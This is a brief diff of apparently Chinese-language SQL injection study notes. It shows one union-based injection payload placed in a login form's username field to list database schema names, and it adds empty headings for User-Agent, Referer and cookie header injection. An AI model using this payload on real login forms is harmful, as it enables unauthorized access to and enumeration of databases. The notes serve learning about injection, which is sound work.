@@ -154,4 +154,10 @@ password:123
  
 uname=' union select 1,group_concat(schema_name) from information_schema.schemata#&passwd=123&Submit=Submit
 
+# HTTP头注入
 
+## uagent注入
+
+## referer注入
+
+## cookie注入
